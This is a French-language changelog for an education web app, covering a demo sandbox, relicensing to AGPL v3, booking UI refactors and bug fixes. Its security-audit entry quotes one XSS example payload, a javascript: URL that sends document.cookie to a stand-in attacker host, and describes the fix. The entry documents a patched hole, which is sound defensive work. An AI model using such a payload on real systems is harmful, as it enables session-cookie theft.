# Changelog

## v2.257.0 (2026-04-28)

### Mode demo jalon V2 + relicensing AGPL v3

**Mode demo (jalon V2)** : la sandbox sans inscription livree en MVP
v2.256 prend de l'epaisseur. Le visiteur explore maintenant l'app
entiere sans crash, avec une promo qui prend vie en arriere-plan.

- **Bots scriptes** (`server/services/demoBots.js`) : worker leger qui
  scanne les sessions actives toutes les 60s et, avec 30% de probabilite
  par tick, fait poster un message plausible par un des 6 etudiants
  fictifs. Pool de phrases ciblees par canal (general / dev-web / algo
  / projets) — l'utilisateur voit du mouvement sans intervention. Skip
  auto en NODE_ENV=test, pilotable via `runOnce()` pour les tests.

- **Cron de purge** (`server/services/demoReset.js`) : tourne toutes les
  heures, supprime tenants + sessions dont le JWT a expire (TTL 24h).
  Pas de cron lib (un setInterval suffit) ; en V3 on alignera sur
  04h00 Paris si besoin.

- **Demo independante du compte courant**. Avant : si un visiteur etait
  deja loggue avec son vrai compte, /demo le redirigeait silencieusement
  vers son dashboard reel — la demo etait inaccessible aux comptes
  actifs. Maintenant : la session reelle est sauvegardee dans
  `cc_session_backup` au lancement, restauree quand le visiteur clique
  "Revenir a mon app" dans le DemoBanner. Les deux sessions sont
  strictement independantes — un prof peut comparer son experience
  reelle et la demo cote a cote.

- **Routes demo elargies** + **fallback wildcard**. Ajout de 25
  endpoints "lecture vide" (booking, documents, bookmarks, signatures,
  teachers, DMs, lumen, kanban, calendar, etc.) pour que les pages du
  frontend ne crashent pas en demo. Plus un fallback global : tout
  endpoint non explicitement defini retourne `{ ok: true, data: [] }`
  pour les GET et `{ ok: false, error: 'demo_unsupported' }` pour les
  ecritures. Le frontend voit l'empty state naturel sans erreur reseau.

- **Test E2E** : ajout d'un cas `endpoints non couverts retournent un
  fallback (pas de 404)` qui verifie le wildcard. 4/4 tests demo passent
  en 13.5s. Pour la suite : V3 ajoutera la presence Socket.IO fake et
  les bots qui apparaissent en `online` dans la liste des etudiants.

**Relicensing MIT -> GNU AGPL v3** : Cursus est deploye comme service
web (app.cursus.school) en plus du code source. MIT et Apache 2.0 ne
couvrent pas le cas SaaS — une EdTech pourrait fork, ajouter des
features proprietaires, et le revendre en SaaS a des ecoles sans
publier ses modifications. AGPL v3 oblige les operateurs reseau a
publier leurs changes sous la meme licence.

Trade-off accepte : peut faire fuir les ecoles privees qui veulent
integrer Cursus a leur SI proprietaire ferme. Pour ce cas, un dual
licensing pourra etre envisage plus tard.

Le LICENSE est maintenant le texte AGPL v3 officiel (verbatim depuis
gnu.org), donc detecte proprement par GitHub via licensee. Toutes les
mentions MIT migrees : package.json (SPDX `AGPL-3.0-or-later`),
README, SettingsAbout, landing FAQ + footer.

**Landing modernisee** :

- Hero CTA repense : "Tester en demo · sans inscription" en bouton
  primaire, "Ouvrir l'app" en secondaire, "Telecharger" en lien tertiaire.
- Nouvelle section "Pour qui ?" avec 2 cards (Enseignants + Etudiants),
  5 points specifiques chacune, CTA dedie vers /demo.
- FAQ avec 8 questions (gratuit, donnees privees, demarrage, vs
  Moodle/Teams, auto-hebergement, fonctionnement demo, mainteneur,
  signaler bug). Format `<details>` natif zero JS.
- Polish des demos : timer Spark Quiz qui pulse rouge les 5 dernieres
  secondes + reveal auto si timeout. Reactions chat sans emoji (SVG
  lucide thumbs-up / party-popper / lightbulb) pour aligner sur la
  regle no-emoji du projet.
- Cache buster `?v=257` sur style.css et app.js (correctif urgent
  apres rapport "CSS casse" — un cache browser servait l'ancien fichier).
- Bio Rohan corrigee : "Enseignant Responsable Pedagogique en
  Informatique au CESI de Montpellier" (au lieu de "etudiant ingenieur").

**Tests demo** : 4/4 E2E passent (13.5s).

- /login -> lien -> /demo affiche les 2 choix
- demarrage etudiant -> dashboard + bandeau visible
- demarrage enseignant -> session prof avec bandeau
- endpoints non couverts retournent un fallback ok+vide

## v2.256.1 (2026-04-28)

### Restaure le Proxy `window.api` perdu en v2.255.1

Regression silencieuse introduite par la refacto `SILENT_FALLBACKS` du
commit precedent : le bloc final `;(window as ...).api = new Proxy(apiImpl, ...)`
a ete remplace accidentellement par un simple commentaire. Resultat dans
le build web : `window.api` etait `undefined`, tout appel
`window.api.X()` crashait avec "Cannot read properties of undefined".

Pas detecte plus tot car :

- L'app Electron n'utilise pas ce shim (le preload Electron pose son
  propre `window.api`, donc le bug etait invisible en local desktop).
- Le test E2E `connecte un enseignant` passait par accident — sa seule
  assertion `toHaveURL(/dashboard/)` matchait avant meme le click submit
  (la route `/` redirige vers `/dashboard` via le router).
- Le test E2E `refuse un login invalide` exposait reellement le bug : le
  `catch` de `useLoginForm` affichait `String(e)` =
  `"Cannot read properties of undefined (reading 'loginWithCredentials')"`,
  qui ne contenait aucun de `erreur|invalide|incorrect`, d'ou l'echec du
  selector du test.

**Fix complementaire : `linkPreview.js` rate-limit IPv6.**

`ERR_ERL_KEY_GEN_IPV6` etait throw par `express-rate-limit` v8+ quand un
`keyGenerator` custom referencait `req.ip` sans utiliser le helper
`ipKeyGenerator`. La validation est swallow par la lib (catch +
`console.error`) donc le serveur tournait quand meme, mais ca polluait
les logs CI a chaque boot. Aligne le pattern avec les autres limiters
(`auth.js`, `messages.js`, `scheduled.js`) : `req.user?.id ?? 'anon'`.

Verifie en local avec `npm run build:web` + Playwright contre le serveur
prod : test `refuse un login invalide` passe en 4.9s.

## v2.256.0 (2026-04-28)

### Sidebar Rendez-vous + retrait de l'EmptyState plein ecran

**Nouvelle `SidebarBooking.vue`** branchee sur la route `booking` (ajout
d'une branche `v-else-if="route.name === 'booking'"` dans `Sidebar.vue`).
Affiche en compact ce qui prenait toute la place avant la promotion en
route top-level (cf. v2.253) :

- Statut Microsoft (cliquable -> ouvre Settings)
- Grille 2x2 de stats : Types actifs, RDV cette semaine, En attente,
  Campagnes (actives + drafts en suffixe)
- Liste des 5 prochains RDV avec date relative (`dans 30 min`, `demain
  14:00`) et lien visio direct
- Action rapide "Nouveau type de RDV" avec raccourci `Ctrl+N`

Communication sidebar -> page via `CustomEvent('cursus:booking-create-type')`
ecoute dans `TabBooking`. Pas de couplage par store/props — un event
suffit pour ce one-shot.

**Retrait du gros EmptyState dans `CampaignManager.vue`** : l'ancien
bloc pleine largeur "Aucune campagne pour le moment" + bouton "Creer ma
premiere campagne" faisait doublon avec le header (qui contient deja le
bouton "Nouvelle campagne") et avec la sidebar. Remplace par un placeholder
discret qui pointe vers le bouton du header.

## v2.255.1 (2026-04-28)

### Bruit console + CSP Pyodide

**`api-shim` web : warn -> debug.** Les warnings
`[api-shim] window.api.X() not implemented in web build — using no-op`
passent de `console.warn` a `console.debug`. Toujours visibles via
DevTools en niveau verbose, mais sans polluer la console par defaut. Les
methodes pure-Electron (`setBadge`, `clearBadge`, `onRuntimeError`,
`onPollUpdate`, `onStatusChange`, `offlineWrite`) sont en plus passees
dans une `SILENT_FALLBACKS` qui les rend totalement silencieuses : ce
sont des features OS-only qui n'auront jamais de version web, c'est
attendu.

**CSP Pyodide.** Ajout de `'unsafe-eval'` + 3 hashes sha256 pour les
`<script>` inline injectes par Pyodide au bootstrap. Sans ca le runner
`.ipynb` de Lumen ne demarrait pas en version web (kernel Python
crashait au boot avec violations `script-src-elem`). Les hashes sont
stables tant qu'on ne bump pas `PYODIDE_VERSION` dans `usePyodide.ts` —
sinon a regenerer depuis les warnings console.

**Pas resolu** dans cette release : `Error: tooltipContainer does not
exist` qui vient d'un bundle vendor minifie qu'on n'a pas pu localiser
sans source maps actifs.

## v2.255.0 (2026-04-28)

### Vue de demarrage configurable + fixes blocs code et v-memo polls

**Nouvelle preference `startView`** (Settings > Preferences > "Au
demarrage") avec 3 choix :

- "Reprendre ou j'etais" (default — pattern Discord/Slack)
- "Toujours le tableau de bord"
- "Toujours les messages"

Le router persiste la derniere route visitee dans `localStorage` via
`afterEach` (chemin + query, hors routes publiques `/book/...`).
`resolveStartRoute()` est appelee dans `App.vue` a la restauration de
session.

**Note technique** : la derniere route est snapshotee a l'import du
module router (pas a l'appel de `resolveStartRoute`) car la premiere
navigation `/` -> redirect `/dashboard` ecraserait l'entree
`localStorage` avant que `App.vue` ait pu la lire. Le router guard reste
authoritative pour les routes inaccessibles (role / module insuffisant).

**Fix bloc de code (markdown).** Le fond etait `rgba(0, 0, 0, .32)` qui
en dark theme sur `--bg-main: #1a1b1d` donnait un noir a peine plus
fonce que le chat — le bloc se confondait visuellement avec le fond.
Utilise maintenant `var(--bg-elevated)`, plus contraste et coherent avec
le header. En light theme, look "carte" comme GitHub / Notion.

**Fix `v-memo` MessageBubble.** `msg.poll_votes` est maintenant trackee.
Avant, un vote arrivant en live (websocket) n'invalidait pas le memo, le
`PollRenderer` ne se rerendait donc pas tant qu'autre chose ne changeait
pas dans le message.

## v2.254.1 (2026-04-28)

### Pills de date qui s'empilent + checkbox tasklist en input text

**Pills de date sticky qui s'empilent au scroll.** Tous les
`.date-separator` etaient des freres directs du meme container scroll, et
un `position: sticky` qui sort du flow ne pousse pas le precedent — il
s'empile dessus. Resultat visible : 3 pills empilees en haut quand on a
3 jours de messages.

Fix : chaque jour est maintenant enveloppe dans un
`<section class="date-group">` qui sert de contexte de scoping au
sticky. Quand on sort du jour, le wrapper sort et la pill avec lui.

**Checkbox tasklist GFM rendue comme un grand rectangle blanc.**
L'`<input>` perdait son attribut `type="checkbox"` quelque part dans le
pipeline `marked -> regex -> DOMPurify`, le browser le rendait donc en
`<input type="text">` par defaut.

Fix robuste : on regenere l'input from scratch dans le replace au lieu
de bricoler les attrs sources (`html.ts`), ce qui garantit
`type="checkbox"` inconditionnel. Tolere aussi un eventuel attribut sur
le `<li>` source au cas ou marked changerait son output.

## v2.254.0 (2026-04-27)

### Apercu visiteur : voir ce que verra l'etudiant

Ajout d'un bouton "Apercu" sur chaque type de RDV et sur chaque campagne
qui ouvre une modale montrant le `BookingFlow` reel tel qu'il apparaitra
a l'etudiant — sans envoyer de mail ni rien enregistrer.

**Nouveaux fichiers :**

- `utils/bookingPreviewSlots.ts` (75 lignes) : generateur de creneaux
  fictifs (jours ouvres, week-ends exclus, heures rondes 9h/10h/14h/15h).
  Adaptatif : 2 creneaux/jour si duree ≥ 90 min, 4 sinon. Format ISO local
  stable independant du fuseau horaire.
- `components/booking/BookingPreviewModal.vue` (180 lignes) : modale qui
  monte le composant `BookingFlow` reel avec les donnees du type / campagne
  ainsi que des slots synthetiques. Banniere "Mode apercu" non-interactive.
  Boutons "Ouvrir le vrai lien" (qui delegue a `window.api.openExternal` si
  Electron, sinon `window.open`) et "Fermer l'apercu". La step de
  confirmation est simulee localement (pas d'appel backend).

**Integration :**

- `TabBookingEventTypes` : nouveau bouton icone Eye sur chaque ligne de
  type, entre le toggle Actif et le bouton Supprimer. Au hover : couleur
  accent. La fonction `openPreview(et)` construit le `BookingFlowInfo`
  depuis l'EventType et passe l'URL publique (uniquement si is_public=1).
- `CampaignManager` : nouveau `UiButton` "Apercu invitation" en tete de la
  rangee d'actions de chaque campagne. Reflete les 2 modes : tripartite
  (avec champs tuteur) ou simple selon `c.with_tutor`.

**Tests (11) :** `bookingPreviewSlots.test.ts` couvre le contrat complet :
nb de creneaux par duree, calcul correct du `end`, exclusion week-end, saut
samedi → lundi suivant, format ISO local, parametre `from`/`startHours`
custom, demarrage depuis aujourd'hui si jour ouvre.

Tests : 1957 passants (+11). Typecheck clean. Lint clean. check:design
clean sur les fichiers modifies.

## v2.253.0 (2026-04-27)

### Promotion de Rendez-vous en onglet top-level

L'onglet "Rendez-vous" du dashboard prof est promu en route top-level
`/booking` avec sa propre entree dans la navigation rail. Justification :
la page est devenue une vraie page d'accueil dediee (stats, callout
prochain RDV, 3 sections, raccourci `Ctrl+N`) et merite un acces 1-clic
au lieu de Dashboard > tab.

**Nouveaux fichiers :**

- `BookingView.vue` (40 lignes) : vue racine qui charge `allStudents` via
  `window.api.getAllStudents()` puis monte `<TabBooking>`. Inclut
  `ErrorBoundary`. Ne tire pas tout `useDashboardTeacher` (allege).

**Routes (`router/index.ts`) :**

- Nouvelle route `/booking`, lazy-load, `meta.requiredRole = 'teacher'`.
  Le route guard existant rejette les etudiants vers `/dashboard`.

**NavRail (`components/layout/NavRail.vue`) :**

- Nouvelle entree `booking` entre `agenda` et `live`, icone `CalendarCheck`,
  libelle "Rendez-vous", `isVisible: appStore.isTeacher`. L'ordre par defaut
  est applique automatiquement aux utilisateurs existants via
  `useNavRailOrder` (les nouveaux items sont appendus a la fin de l'ordre
  sauvegarde sans casser la personnalisation).

**Dashboard prof (`DashboardTeacher.vue`) :**

- Retrait du bouton "RDV" de la barre d'onglets secondaires.
- Retrait du `<TabBooking>` du switch `dashTab`.
- Retrait de `'booking'` des unions de types `DashTabType` et `update:dashTab`.
- Retrait de l'import `TabBooking` et de l'icone `CalendarDays` (devenue
  inutilisee).

**Migration douce (`DashboardView.vue`) :**

- Si l'URL contient `?tab=booking` (ancien lien sauvegarde / bookmark),
  redirige automatiquement vers `/booking` (uniquement pour les profs).
- Watch sur `route.query.tab` qui applique la meme redirection a chaque
  navigation.
- Retrait de `'booking'` du type `DashTab` et de `VALID_TABS`.

Le composant `TabBooking.vue` lui-meme n'est pas modifie : il est juste
monte par `BookingView` au lieu de `DashboardTeacher`.

Tests : 1946 passants. Typecheck clean. Lint clean (warnings preexistants).
check:design clean sur les fichiers modifies.

## v2.252.0 (2026-04-27)

### Refonte UX/UI page d'accueil RDV (cote prof)

`TabBooking.vue` n'etait qu'une top-bar + 3 colonnes. Refait en vraie page
d'accueil avec hierarchie visuelle, contexte immediat et raccourcis pour
le quotidien du prof.

**Nouvelle hierarchie :**

- `UiPageHeader` (composant partage) avec titre + sous-titre + actions a
  droite (pill statut Microsoft + CTA "Nouveau type" avec raccourci
  visualise `Ctrl N`).
- **Stats strip** 4 KPI : "Types actifs (X/Y)" / "RDV cette semaine" /
  "En attente" (alert warning si > 0) / "Prochain RDV" (texte court
  "Aujourd'hui 14h", "Demain 09h" ou date complete).
- **"Prochain RDV" callout** : carte saillante affichee uniquement si un
  RDV est prevu dans les 24 prochaines heures. Inclut titre du type,
  partie prenante, libelle relatif ("Dans 45 min" / "A 14h"), et bouton
  "Rejoindre" direct si une URL visio est attachee.
- CampaignManager + 3 sections (types / disponibilites / mes RDV) en
  dessous.

**Performance :**

- `SkeletonLoader` (composant partage) pendant le fetch initial : 4 cards
  pour la stats strip + 3 listes pour les colonnes. Anim shimmer respectant
  `prefers-reduced-motion`. Remplace le texte "Chargement..." nu.
- Toutes les stats sont des `computed` reactifs (pas de re-calcul au scroll).

**Ergonomie :**

- Raccourci global `Ctrl/Cmd+N` pour ouvrir le formulaire de creation
  (desactive si focus dans un input/textarea pour ne pas bloquer la saisie).
- Filtre de recherche dans la section "Types d'evenements" — affiche
  automatiquement quand 4+ types existent. Filtre par titre OU slug, avec
  bouton X pour effacer et message "Aucun type ne correspond a..." si vide.
- Badges de comptage dans les 3 entetes de section (`{{ count }}` en pill
  a droite du titre) pour situer le volume d'un coup d'oeil.
- Empty state propre dans "Types d'evenements" quand aucun type n'est
  configure (icone + titre + sous-titre, via `EmptyState` partage).
- Pill Microsoft : tone success quand connecte (vert avec point), neutral
  sinon. Cliquable pour ouvrir Settings > Integrations.

**Design system :**

- Tokens partout : `var(--space-*)`, `var(--radius-*)`, `var(--motion-*)`,
  `var(--ease-*)`, `--focus-ring`, `--elevation-*`.
- `color-mix(in srgb, var(--accent) X%, transparent)` pour tous les fonds
  doux (callout, stat-card accent, ms-pill ok). Plus aucun rgba/hex
  hardcode dans les nouveaux blocs.
- Reutilisation systematique des composants UI partages :
  `UiPageHeader`, `UiButton`, `SkeletonLoader`, `EmptyState`.

Tests : 1946 passants. Typecheck clean. Lint clean. check:design clean.

## v2.251.3 (2026-04-27)

### Split TabBooking : 673 lignes -> 1 orchestrateur + 3 sections

`TabBooking.vue` etait un monolithe de 673 lignes mixant 3 responsabilites
distinctes. Decoupage en 4 fichiers a responsabilite unique :

- `TabBooking.vue` (151 lignes) : orchestrateur leger. Instancie une seule
  fois `useBooking()`, gere le bandeau Microsoft + listeners socket, et
  delegue le rendu aux 3 sections via prop `booking`.
- `TabBookingEventTypes.vue` (585 lignes) : types de RDV + creation + lien
  public/Jitsi/lien nominatif/bulk + QR codes.
- `TabBookingAvailability.vue` (202 lignes) : grille hebdomadaire des
  disponibilites.
- `TabBookingMyBookings.vue` (164 lignes) : toggle vue calendrier/liste.

**Type partage `BookingHandle`** : nouveau type exporte par `useBooking.ts`
(`ReturnType<typeof useBooking>`) pour typer la prop `booking` sans
redeclarer chaque ref individuellement dans chaque enfant.

**A11y baseline** : `aria-pressed` sur les toggles Active/Public/Jitsi,
`aria-busy` sur le bouton de sauvegarde des disponibilites, paire
`role="tablist"`/`role="tab"` avec `aria-pressed` sur le toggle
calendrier/liste, libelles explicites sur tous les inputs `time` et bouton
supprimer (avec contexte de la valeur supprimee), `type="button"` sur tous
les boutons hors form.

**Tokens design system** :

- Tous les `var(--space-*)`, `var(--radius-*)`, `var(--motion-*)`,
  `var(--ease-*)`, `var(--focus-ring)` au lieu des valeurs hardcodees.
- Badges status (success/warning/danger) passent sur `color-mix(in srgb,
  var(--color-*) X%, transparent)` au lieu des hex.
- Palette d'identification des types (12 couleurs) explicitement marquee
  comme palette fixe (pas des tokens theme), commentee comme telle.
- Microsoft status dot : passe de `#22c55e` / `#94a3b8` vers
  `var(--color-success)` / `var(--text-muted)`.

Tests : 1946 passants (aucun nouveau, aucune regression). Typecheck clean.
Lint clean. check:design clean.

## v2.251.2 (2026-04-27)

### Tests useBooking + extraction helpers BookingFlow + a11y baseline

**Tests `useBooking.ts`** (35 tests, etait 0) :

- `fetchAll` (parallele, erreur reseau, ok=false par appel)
- `sortedBookings` (tri sans mutation), `rulesByDay` (groupage)
- `createEventType` (ok / erreur backend / exception)
- `toggleActive` (flip + patch local optimiste)
- `togglePublic` : cas critique du slug allonge cote backend (anti-enumeration), cas no-data fallback patch local, toast "active" vs "desactive"
- `toggleJitsi`, `getPublicUrl`, `deleteEventType` (avec confirm() = false / true / erreur)
- `generateLink`, `generateBulkLinks` (ratio dans le toast)
- `addSlot` (validation horaires invalides, id negatif), `removeSlot` (par reference)
- `saveAvailability` (serialisation sans id, refetch, reset savingAvailability sur exception)
- Socket listeners : `initSocketListeners` souscrit, `onBookingNew` toast + refetch, `disposeSocketListeners` idempotent
- `statusLabel`, `statusClass` (mapping + fallback)

**Extraction helpers purs** (`utils/bookingHelpers.ts` + 13 tests) :

- `toIso`, `fmtDateLong`, `fmtTime`, `detectUserTimezone`, `bookingErrorTitle`, `DAY_INITIALS_FR`.
- Auparavant inlines dans `BookingFlow.vue` (donc impossibles a tester directement). BookingFlow passe sur ces imports.
- Mutualisation : `useBooking` reutilise `SERVER_URL` depuis `useBookingApi` (etait redeclare).

**A11y baseline `BookingFlow.vue`** :

- `role="alert"` + `aria-live="assertive"` sur l'etat erreur, `role="status"` + `aria-live="polite"` sur loading et confirmation.
- `aria-label` sur les jours du calendrier ("lundi 27 avril 2026 (creneaux disponibles)") et `aria-pressed` sur le jour selectionne.
- `aria-label` sur les boutons de creneau ("Reserver 14:00").
- `aria-required="true"` sur les inputs requis du formulaire.
- `aria-busy` sur le bouton de soumission pendant la requete.
- `role="alert"` + `aria-live="polite"` sur les messages d'erreur captcha et backend.
- `aria-hidden="true"` sur les icones decoratives.
- `type="button"` explicite sur tous les boutons hors form (evite les submit non voulus).
- `novalidate` sur le form (validation custom via canSubmit).

Tests : 1946 passants (48 nouveaux). Typecheck clean. Lint clean.

## v2.251.1 (2026-04-27)

### Refacto booking : DRY composables + extraction BookingShell

Suite a l'audit du systeme de booking, extraction des duplications haute valeur :

**Nouveau composable `useBookingApi.ts`** (40 lignes) :

- Mutualise le wrapper `fetchWithTimeout` + parsing JSON + mapping AbortError/network qui etait duplique a l'identique entre `usePublicBooking` (wrapper `apiFetch`, 12 lignes) et `useCampaignBooking` (wrapper `api`, 12 lignes).
- Centralise la resolution `SERVER_URL` via env (etait redeclare dans les 2 fichiers).
- Expose `buildIcsUrl(basePath, bookingId)` reutilise par `usePublicBooking.icsUrl()`.
- Type `ApiResult<T>` partage : enveloppe `{ ok, data, error, code }`.

`usePublicBooking.ts` passe de 169 -> 144 lignes ; `useCampaignBooking.ts` passe de 136 -> 110 lignes. Total : ~50 lignes de duplication eliminees, signatures inchangees pour les callers.

**Nouveau composant `BookingShell.vue`** (30 lignes) :

- Coque visuelle (background, centrage, padding responsive, dark mode via `prefers-color-scheme`) qui etait dupliquee mot pour mot dans les 3 wrappers `BookingPublicView`, `BookingPublicEventView`, `BookingCampaignView`.
- Les 3 vues passent en wrappers minimaux (~10 lignes chacune au lieu de 30).

**Nouveaux tests (32)** :

- `useBookingApi.test.ts` : 10 tests sur le wrapper (success, ok=false, AbortError, TimeoutError, erreurs reseau, prefixage SERVER_URL, opts.method/headers, buildIcsUrl token+event).
- `usePublicBooking.test.ts` : 22 tests sur le composable public (modes token/event, encodage de l'identifiant, fetchEventInfo + erreurs, fetchSlotsRange parallele + dedup + tri, selectSlot/back, bookSlot avec contrats de payload differents par mode, icsUrl token vs event).

Tests : 1898 passants (32 nouveaux). Typecheck clean. Lint clean.

## v2.251.0 (2026-04-27)

### Tests booking + retrait Teams + refonte UX CampaignManager

**Tests booking & campagnes (72 nouveaux tests)** :

- `bookingFlow.test.ts` : 32 tests sur la logique pure de BookingFlow.vue (toIso, buildMonthGrid, slotsByDate, canSubmit, errorTitle, canGoPrev, auto-selection 1ere date dispo, pre-remplissage formulaire).
- `useCampaigns.test.ts` : 22 tests sur le composable de gestion des campagnes (CRUD, cycle de vie draft/active/closed, filtres calcules, refetch, toasts).
- `useCampaignBooking.test.ts` : 18 tests sur le composable etudiant (fetchInfo + booking existant, fetchSlots, selectSlot/back, payload tripartite, error mapping, AbortError).

**Retrait Teams de l'UI** :

- AgendaView : suppression du checkbox "Creer une reunion Teams + Outlook", du bouton "Rejoindre Teams" dans le panneau detail, du compteur Teams dans le hero jour/semaine, de l'entree Teams du context menu, des classes CSS `.ag-btn--teams`/`.ag-check-label`.
- SettingsIntegrations : carte renommee "Microsoft Outlook", description recentree sur la sync calendrier.
- TabBooking : retrait de la mention "Prend le pas sur Microsoft Teams meme si connecte".
- WidgetAgendaJour : retrait du bouton "Rejoindre Teams".
- WidgetQuickLinks : retrait du lien Teams par defaut.

L'integration Microsoft 365 OAuth reste en place pour la sync Outlook (sans creation de reunion Teams).

**Refonte UX/UI CampaignManager** :

- Passe entierement sur les composants UI partages : `UiCard` (avec `accentColor`), `UiPill` (tones semantiques), `UiButton` (avec loading), `EmptyState`, `Modal`, `useConfirm`.
- Tokens design respectes : `var(--space-*)`, `var(--radius-*)`, `var(--motion-*)`, `var(--ease-*)`. Plus aucun hex hardcode (passage a `color-mix(in srgb, var(--color-*) X%, transparent)`).
- Bandeau stats en haut (brouillons / actives / cloturees / ratio reservations).
- Palette couleurs restreinte (6 swatches brand) au lieu d'un picker hex libre.
- Selecteur jours en chip-toggle (style Calendly) au lieu d'un `<select>`.
- Toggle cards illustrees pour Tripartite et Jitsi avec description inline.
- Skeleton shimmer pendant le chargement.
- EmptyState avec CTA "Creer ma premiere campagne".
- Meta-chips par campagne (duree, tripartite, Jitsi auto, jours exclus).
- Progress bar semantique (muted < 25% → warning < 75% → success).
- Validation footer qui nomme les champs manquants.
- a11y : `role="radiogroup"`, `aria-checked`, `aria-expanded/controls`, `aria-labels`, `--focus-ring` partout.
- Confirmations unifiees via `useConfirm` (variant info/warning/danger).

Tests : 1866 passants (40 nouveaux campagnes + 32 nouveaux BookingFlow). Typecheck clean. Lint clean. check:design clean sur les fichiers modifies.

## v2.250.4 (2026-04-27)

### Fix : `window.api.onBookingNew is not a function` en mode web

Symptome : sur le build web (cursus.school via navigateur), plein d'onglets (Documents, Rendez-vous, etc.) plantaient avec `window.api.onBookingNew is not a function` ou variantes (`onBookingCancelled`, `onAuthExpired`, `onStatusChange`, `onPollUpdate`, `onLiveCodeUpdate`, ...). Cause : le shim `src/web/api-shim.ts` n'expose qu'un sous-ensemble du preload Electron. A chaque feature ajoutee au preload sans toucher au shim, le mode web casse.

**Fix immediat — handlers manquants** :

Ajout explicite dans le shim de `onBookingNew`, `onBookingCancelled` et `onAuthExpired`, plus le wiring socket `booking:new` / `booking:cancelled`.

**Fix structurel — Proxy fallback** :

`window.api` est maintenant wrappe dans un `Proxy` qui intercepte les proprietes inconnues et retourne un fallback degrade :

- `on*` / `off*` -> retourne un unsubscribe no-op `() => {}`
- `emit*` / `set*` / `clear*` -> retourne `undefined`
- Methodes async -> `Promise.resolve({ ok: false, error: 'Action non disponible sur le web', _webFallback: true })`

Chaque methode unknown est loggee une seule fois en console (`[api-shim] window.api.xxx() not implemented`) pour faciliter le debug ulterieur sans bruit. L'app continue a marcher gracefully au lieu de crasher.

**Compromis** : ce filet masque potentiellement de vraies regressions (une route renommee qui devrait fonctionner en web). Acceptable car le mode web reste secondaire et le warning console pointe immediatement vers la cause.

Tests : 42 passants (8 booking + 34 app store). Typecheck clean.

## v2.250.3 (2026-04-27)

### Fix : creation de campagne (suspect zod refine + log diagnostique)

Apres le durcissement v2.250.1, des utilisateurs voient "Erreur a la creation" au POST /api/bookings/campaigns. Sans access aux logs prod, fix preventif + amelioration du log pour un futur diagnostic.

**Fix probable** : le `refine()` zod ajoute sur `fallbackVisioUrl` interagissait possiblement mal avec `.optional().nullable()` en zod v4 quand le champ etait absent. Remplace par un `z.preprocess()` qui convertit `null` / `""` / `undefined` en `undefined` AVANT la chaine de validation. Applique aux 2 endroits (`teacherAdmin.js` et `campaigns.js`).

**Log diagnostique** : le handler POST `/campaigns` enveloppe la creation dans un try/catch qui logue `error`, `stack`, `payloadKeys` cote serveur. Le wrap masque le detail au client (anti-leak), mais on garde la trace serveur pour debug ulterieur.

## v2.250.2 (2026-04-27)

### Fix : bandeau "session expirée" qui reste collé après reconnexion

Symptome : un utilisateur recoit un 401 sur une requete (token JWT temporairement expire, race au demarrage), le bandeau rouge `Votre session a expire. Veuillez vous reconnecter.` s'affiche, `logout()` est appele, l'utilisateur se reconnecte (manuellement ou via `restoreSession` au reload). Mais `sessionExpiredMessage` n'etait jamais reset -> bandeau persistant alors que l'app marche.

**Fix** :

- `login()` et `restoreSession()` reset `sessionExpiredMessage.value = ''`. Une nouvelle session = pas de bandeau herite.
- Bouton de fermeture (×) sur le bandeau via `dismissSessionExpired()` expose par le store. L'utilisateur peut le fermer si la condition de declenchement persiste (ex: 401 sur une route polling en arriere-plan).
- Reorganisation : `sessionExpiredMessage` declare en haut du store (avec les autres refs d'etat) au lieu d'etre cache dans `initAuthExpiredListener`. Plus simple a auditer.

Tests : 34 tests app store passent. Typecheck propre.

## v2.250.1 (2026-04-27)

### Booking : durcissement post-audit (1 BLOQUANT + 5 IMPORTANT + 2 NICE)

Audit refacto + securite sur la stack booking v2.245-v2.250. Synthese des fixes :

**BLOQUANT — XSS via `joinUrl` dans tous les mails (B1)** :

- `<a href="${joinUrl}">` injecte la valeur sans whitelist de scheme ni escape attribut. Un prof posait `fallbackVisioUrl: "javascript:fetch('https://attacker/?c='+document.cookie)"` -> le mail HTML execute le payload chez l'etudiant + tuteur + co-prof a chaque clic.
- Fix : nouveau helper `safeHttpUrl(u)` (whitelist `^https?://`, parse via `URL`) dans `server/utils/escHtml.js`. Applique aux 5 templates (`sendBookingConfirmation`, `sendBookingCancellation`, `sendBookingReminder`, `sendBookingReschedule`, `sendCampaignInvite`, `sendTripartiteConfirmation`). Plus tous les `href` passent par `escHtml(safeHttpUrl(...))`.
- Defense en profondeur cote zod : `fallbackVisioUrl` dans `teacherAdmin.js` et `campaigns.js` refuse maintenant explicitement les schemes non-http(s) via `.refine()`.

**IMPORTANT** :

- **I2 — DELETE campagne avec bookings** : la suppression effacait l'event_type "fantome" qui faisait disparaitre les bookings historiques en cascade. Nouveau guard `countCampaignBookings()` rejette le DELETE si > 0 reservations confirmees, message clair "Cloture-la plutot".
- **I3 — captcha fail-open silencieux** : si `TURNSTILE_SECRET_KEY` disparait en prod (rotation rate, redeploy partiel), le captcha desactivait sans alerte. Ajout d'un `log.warn` au boot quand `NODE_ENV=production` et la var est manquante.
- **I5 — race condition double-launch** : double-clic sur "Lancer" envoyait potentiellement 2x les mails. Nouveau helper `transitionCampaignStatus(id, fromStatus, toStatus)` qui fait un `UPDATE ... WHERE id=? AND status=?` atomique ; si `changes() === 0`, on rejette avec 400.
- **I6 — slug enumerable si user-choisi long** : `ensurePublicSlug` n'allongeait que si `< 10 chars`. Un prof avec slug `cesi-rohan-2026` (15 chars) restait devinable. Le helper genere maintenant SYSTEMATIQUEMENT un suffixe `-XXXXX` (5 chars hex) sauf si le slug en porte deja un (idempotence).

**NICE-TO-HAVE** :

- **N2 — `escIcs` ne strippait pas `\r`** : un attendee `name = "X\rNEWHEADER:foo"` injectait une nouvelle property ICS. Regex etendue a `/\r\n|\r|\n/g`.

**Refactoring (impact propre)** :

- Code mort retire : `slotsByDate`, `weekStart` (refs/computed) dans `usePublicBooking.ts`, `slotsByDate`, `sortedDates` dans `useCampaignBooking.ts`. La refonte `BookingFlow.vue` recalcule son propre groupement, ces exports etaient orphelins.
- `fetchSlots(weekOffset)` (single-week) supprime de `usePublicBooking` au profit du `fetchSlotsRange(8)` deja en place.

**Tests** : 21/21 booking tests passent. Typecheck clean.

**Non traite dans ce patch** (a planifier) :

- Refactoring du service `bookingService.confirmBooking` pour mutualiser les 3 handlers POST `/book` qui dupliquent ~250 lignes (visio + ICS + email + reminder + socket). Effort 1/2 journee, faut une suite de tests d'integration d'abord.
- Renommage `bookings.teams_join_url` -> `bookings.visio_join_url` (la colonne contient deja du Jitsi). Migration + 9 callsites.
